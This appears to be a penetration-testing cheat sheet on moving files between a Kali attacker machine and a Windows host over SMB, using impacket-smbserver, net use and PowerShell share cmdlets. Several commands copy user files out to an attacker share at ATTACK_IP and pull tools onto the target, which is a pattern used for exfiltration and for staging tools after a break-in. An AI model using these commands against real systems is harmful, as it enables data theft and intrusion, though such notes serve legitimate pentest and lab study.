# SMB Share

### 1) On Kali, create an SMB Server using impacket

    impacket-smbserver -smb2support <share_name> <directory>

### 2) Transfer files using the copy command on Windows machine

Map the share

    net use Z: \\<Kali-IP>\<share-name> /user:kali 'root'

Interact with the share

    dir Z:\
    dir Z:\file.txt
    copy C:\Users\USER\file.txt Z:\
    copy Z:\tool.exe C:\temp\tool.exe

Download: 
    
    copy \\<Kali-IP>\<share_name>\tool.exe

Upload: 
    
    copy notes.txt \\<Kali-IP>\<share_name>\

### 3) PowerShell

#### SmbShare Module

    New-SmbMapping -RemotePath '\\\\ATTACK_IP\\share' -Username "kali" -Password "root" -LocalPath 'F:'
    cd F:
    cp C:\\Users\\USER\\Desktop\\file.txt ./

Disconnect the share

    Remove-SmbMapping -LocalPath 'Z:' -Force

#### PSDrive Cmdlets

Map the share anonymously

    New-PSDrive -Name 'Z' -PSPRovider FileSystem -Root \\<Kali-IP>\<share-name>

Map the share with credentials

    $username = 'kali'
    $password = 'root' | ConvertTo-SecureString -AsPlaintext -Force
    $credential = New-Object PSCredential -ArgumentList $username,$password
    New-PSDrive -Name 'Z' -PSPRovider FileSystem -Root \\<Kali-IP>\<share-name> -Credential $credential

Disconnect the share

    Remove-PSDrive -Name 'Z'

Interacting with the share

    Get-ChildItem Z:\
    Get-ChildItem Z:\filename.txt
    Copy-Item Z:\tool.exe C:\Windows\Temp\tool.exe
    Copy-Item C:\Users\USER\file.txt Z:\
